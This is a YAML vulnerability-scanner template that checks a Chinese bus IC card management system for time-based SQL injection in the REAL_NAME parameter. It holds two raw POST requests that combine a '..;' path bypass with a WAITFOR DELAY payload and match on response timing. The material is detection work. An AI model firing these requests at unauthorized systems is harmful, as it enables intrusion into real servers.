id: poc-yaml-bus-ic-user-sqli
info:
  name: 公交IC卡收单管理系统 REAL_NAME参数 sql注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Identifies a SQL injection vulnerability in the 公交IC卡收单管理系统 application, specifically in the REAL_NAME parameter.
variables:
  t1: "{{rand_int(3,5)}}"
  t2: "{{to_number(t1)*2}}"
  t3: "{{to_number(t2)+2}}"
  t4: "{{rand_int(1,3)}}"
  t5: "{{to_number(t4)*2}}"
  t6: "{{to_number(t5)+2}}"
http:
  - raw:
      - |
        POST /assets/..;/user HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _search=false&nd=&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=1');WAITFOR%20DELAY%20'0:0:{{t1}}'--&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "window.top.window.jQuery"
          - "\"#temporary_iframe_id\""
          - "\"pageCount\":0"
      - type: dsl
        dsl:
          - duration >= to_number(t2)
          - duration <= to_number(t3)
  - raw:
      - |
        POST /assets/..;/user HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _search=false&nd=&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=1');WAITFOR%20DELAY%20'0:0:{{t4}}'--&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "window.top.window.jQuery"
          - "\"#temporary_iframe_id\""
          - "\"pageCount\":0"
      - type: dsl
        dsl:
          - duration >= to_number(t5)
          - duration <= to_number(t6)
